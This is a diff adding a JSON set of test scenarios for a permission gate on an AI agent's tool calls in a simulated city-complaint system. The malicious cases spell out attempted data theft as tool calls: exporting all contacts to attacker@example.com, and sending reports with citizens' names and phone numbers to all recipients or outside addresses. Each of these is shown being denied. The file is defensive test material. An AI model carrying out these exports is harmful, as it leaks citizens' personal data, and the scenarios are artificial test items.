@@ -1,0 +1,269 @@
+[
+  {
+    "id": "S-L1",
+    "lens": "Social",
+    "kind": "legit",
+    "title": "Officer reads own complaint; phone masked",
+    "profile": "basic",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "read_complaint",
+        "args": {
+          "complaint_id": "C-101"
+        },
+        "decision": "ALLOW",
+        "rule": "ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0
+    },
+    "custom": "phone_masked"
+  },
+  {
+    "id": "S-M1",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Export of all contacts refused",
+    "profile": "basic",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "export_contacts",
+        "args": {
+          "destination": "attacker@example.com"
+        },
+        "decision": "DENY",
+        "rule": "TOOL_NOT_PERMITTED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0
+    }
+  },
+  {
+    "id": "S-M2",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Complaint asks for full phone; read stays masked",
+    "profile": "basic",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "read_complaint",
+        "args": {
+          "complaint_id": "C-101"
+        },
+        "decision": "ALLOW",
+        "rule": "ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0
+    },
+    "custom": "phone_masked"
+  },
+  {
+    "id": "S-M3",
+    "lens": "Social",
+    "kind": "check",
+    "title": "Raw phone numbers never appear in audit rows",
+    "profile": "basic",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "read_complaint",
+        "args": {
+          "complaint_id": "C-101"
+        },
+        "decision": "ALLOW",
+        "rule": "ALLOWED"
+      },
+      {
+        "tool": "export_contacts",
+        "args": {
+          "destination": "attacker@example.com"
+        },
+        "decision": "DENY",
+        "rule": "TOOL_NOT_PERMITTED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0
+    },
+    "custom": "no_raw_phone_in_audit"
+  },
+  {
+    "id": "S-L2",
+    "lens": "Social",
+    "kind": "legit",
+    "title": "Status report with safe fields to the ward office",
+    "profile": "reporting",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "send_report",
+        "args": {
+          "complaint_id": "C-101",
+          "recipient": "ward-office@bmc-sim.example",
+          "scope": "complaint",
+          "fields": [
+            "ward",
+            "location",
+            "issue",
+            "status"
+          ]
+        },
+        "decision": "ALLOW",
+        "rule": "ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0,
+      "reports": 1
+    }
+  },
+  {
+    "id": "S-M4",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Allowed tool, all-citizens scope refused",
+    "profile": "reporting",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "send_report",
+        "args": {
+          "complaint_id": "C-101",
+          "recipient": "ward-office@bmc-sim.example",
+          "scope": "all_citizens",
+          "fields": [
+            "ward",
+            "location",
+            "issue",
+            "status"
+          ]
+        },
+        "decision": "DENY",
+        "rule": "SCOPE_NOT_ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0,
+      "reports": 0
+    }
+  },
+  {
+    "id": "S-M5",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Allowed tool + allowed recipient, phone numbers in fields refused",
+    "profile": "reporting",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "send_report",
+        "args": {
+          "complaint_id": "C-101",
+          "recipient": "ward-office@bmc-sim.example",
+          "scope": "complaint",
+          "fields": [
+            "ward",
+            "name",
+            "phone"
+          ]
+        },
+        "decision": "DENY",
+        "rule": "SENSITIVE_FIELDS_NOT_ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0,
+      "reports": 0
+    }
+  },
+  {
+    "id": "S-M6",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Unknown data field refused by argument schema",
+    "profile": "reporting",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "send_report",
+        "args": {
+          "complaint_id": "C-101",
+          "recipient": "ward-office@bmc-sim.example",
+          "scope": "complaint",
+          "fields": [
+            "ward",
+            "ssn"
+          ]
+        },
+        "decision": "DENY",
+        "rule": "ARG_INVALID"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0,
+      "reports": 0
+    }
+  },
+  {
+    "id": "S-M7",
+    "lens": "Social",
+    "kind": "malicious",
+    "title": "Everything wrong at once: external, all citizens, phones",
+    "profile": "reporting",
+    "target": "C-101",
+    "acts": [
+      {
+        "tool": "send_report",
+        "args": {
+          "complaint_id": "C-101",
+          "recipient": "attacker@example.com",
+          "scope": "all_citizens",
+          "fields": [
+            "name",
+            "phone"
+          ]
+        },
+        "decision": "DENY",
+        "rule": "DESTINATION_NOT_ALLOWED"
+      }
+    ],
+    "expect": {
+      "work_orders": 0,
+      "closed": 0,
+      "exports": 0,
+      "outbox": 0,
+      "reports": 0
+    }
+  }
+]
